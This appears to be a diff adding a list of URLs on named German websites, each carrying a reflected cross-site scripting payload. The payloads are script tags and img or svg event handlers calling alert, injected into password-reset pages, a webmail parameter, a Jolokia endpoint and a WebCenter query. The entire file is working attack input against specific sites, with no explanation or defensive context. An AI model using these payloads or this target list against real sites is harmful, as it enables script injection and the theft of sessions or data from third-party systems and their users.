@@ -1,0 +1,7 @@
+http://festungbreslau.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://filedealer.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://finnland-rundreisen.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://first-class-racing.de/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+http://fluessigboden-kuellmer.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://frankfurt-plus.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://feuerwehr-strass.de/cs/idcplg?FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&IdcService=GET_SEARCH_RESULTS&PageName=indext&PageTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&ResultCount=20&ResultTemplate=StandardResults&ResultsTitle=AAA&SortField=dInDate&SortOrder=Desc&dSecurityGroup
